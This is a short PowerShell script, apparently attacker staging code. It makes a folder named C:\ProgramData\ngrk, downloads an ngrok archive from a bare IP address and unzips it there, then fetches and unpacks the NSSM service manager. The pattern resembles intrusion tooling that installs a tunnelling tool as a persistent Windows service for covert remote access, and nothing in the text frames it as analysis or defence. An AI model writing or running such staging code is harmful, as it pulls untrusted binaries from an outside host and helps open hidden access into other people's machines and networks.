Function 1 {
mkdir C:\ProgramData\ngrk
cd "C:\ProgramData\ngrk"
# Download NGROK
$clnt = new-object System.Net.WebClient
$url = "http://64.44.102.190/ngrok.zip"
$file = "C:\ProgramData\ngrk\ngrok.zip"
$clnt.DownloadFile($url,$file)

# Unzip NGROK
$shell_app=new-object -com shell.application 
$zip_file = $shell_app.namespace($file) 
$destination = $shell_app.namespace("C:\ProgramData\ngrk\") 
$destination.Copyhere($zip_file.items())

#Download NSSM
$clnt = new-object System.Net.WebClient
$url = "http://nssm.cc/release/nssm-2.24.zip"
$file = "C:\ProgramData\ngrk\nssm-2.24.zip"
$clnt.DownloadFile($url,$file)

#Unzip NSSM
$shell_app=new-object -com shell.application 
$zip_file = $shell_app.namespace($file) 
$destination = $shell_app.namespace("C:\ProgramData\ngrk\") 
$destination.Copyhere($zip_file.items())
}